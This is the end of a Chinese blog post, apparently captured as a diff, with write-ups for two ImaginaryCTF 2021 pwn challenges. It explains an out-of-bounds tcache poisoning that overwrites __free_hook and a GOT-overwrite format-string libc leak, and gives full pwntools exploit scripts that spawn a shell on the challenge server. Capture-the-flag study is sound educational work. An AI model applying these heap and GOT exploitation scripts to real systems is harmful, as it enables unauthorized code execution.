+<h2 id="string-editor-1"><a href="#string-editor-1" class="headerlink" title="string_editor_1"></a>string_editor_1</h2><p>有意识的一道题，一次只能写入一个字符。但是由于存在数组下标越界，修改管理tetach，range 0x30 tache大于7且第一个的值向<code>__free_hook</code>附近（free_hook-0x20）.利用tache 优先级高于tache的特性，申请到free_hook-0x20的空间，在<code>__free_hook</code>写入<code>system</code>的地址，在free_hook-0x20写入<code>/bin/sh</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'string_editor_1'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42004</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">'But first, a word from our sponsors:'</span>)</span><br><span class="line">system_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line">x=finder(<span class="string">'system'</span>,system_addr)</span><br><span class="line">free_hook=p64(x.dump(<span class="string">'__free_hook'</span>)<span class="number">-0x20</span>)</span><br><span class="line">p.sendline(str(<span class="number">-0x290</span>))</span><br><span class="line">p.sendline(<span class="string">'x'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(free_hook),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">-0x211</span>+i))</span><br><span class="line">    p.sendline(free_hook[i<span class="number">-1</span>])</span><br><span class="line">p.sendline(<span class="string">'15'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">system_addrs=p64(system_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system_addrs),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">0x20</span>+i<span class="number">-1</span>))</span><br><span class="line">    p.sendline(system_addrs[i<span class="number">-1</span>])</span><br><span class="line">shall=<span class="string">'\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="string-editor-2"><a href="#string-editor-2" class="headerlink" title="string_editor_2"></a>string_editor_2</h3><p>由于只能下溢出（负数），但能修改got表。修改strpy.got为pintf.got.plt.来通过格式化字符串泄露libcbase。</p>
+<p>这里本地打通了，远程一直没打通，赛后专门看来dalao wp发现方法对的，可能是kali的原因（orw）。</p>
+<p>想了个傻雕方法用<code>add-sysmbols</code>来猜与真实libcbase的差值 。</p>
+<p>然后在修改strpy.got为system的真实地址，得到shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./string_editor_2'</span></span><br><span class="line"><span class="comment">#0x601080</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-l:'</span>+hex(libc.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">LIBC=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-r:'</span>+hex(LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42005</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">shall='\x00/bin/sh\x00'</span></span><br><span class="line"><span class="string">for i in range(len(shall),-1,-1):</span></span><br><span class="line"><span class="string">    p.sendline(str(-i+8))</span></span><br><span class="line"><span class="string">    p.sendline(shall[-i])</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#864e50</span></span><br><span class="line">sys=p64(e.sym[<span class="string">'printf'</span>]).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'%13$p'</span></span><br><span class="line"><span class="comment">#shall='%16$p' #0x100000000</span></span><br><span class="line"><span class="comment">#shall='%13$p'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">'***'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(p.recvuntil(<span class="string">'%'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x3f</span><span class="number">-0xb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(addr-LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys=p64(x.dump(<span class="string">'system'</span>)).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'\x00\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2021-07-28, 23:40:37</p>
+        <p><span>最后更新:</span>2021-07-29, 00:28:20</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/07/28/imaginaryctf2021--pwn-wp/" title="imaginaryctf2021-pwn-wp">lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2021/08/17/ractf2021-pwn-ctf/">
+                    ractf2021-pwn-ctf
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">
+                    高版本libc(2.29-2.32) off by null利用姿势笔记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fake-canary"><span class="toc-text">fake_canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linonophobia"><span class="toc-text">linonophobia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memory-pile"><span class="toc-text">memory_pile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stackoverflow"><span class="toc-text">stackoverflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#the-first-fit"><span class="toc-text">the_first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#string-editor-1"><span class="toc-text">string_editor_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#string-editor-2"><span class="toc-text">string_editor_2</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"imaginaryctf2021-pwn-wp　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2021/08/17/ractf2021-pwn-ctf/" title="上一篇: ractf2021-pwn-ctf">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" title="下一篇: 高版本libc(2.29-2.32) off by null利用姿势笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2021 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    
+                
+                
+                    <span>| </span>
+                
+                
+                    
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                  
+                
+	
+            
+
+
+
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
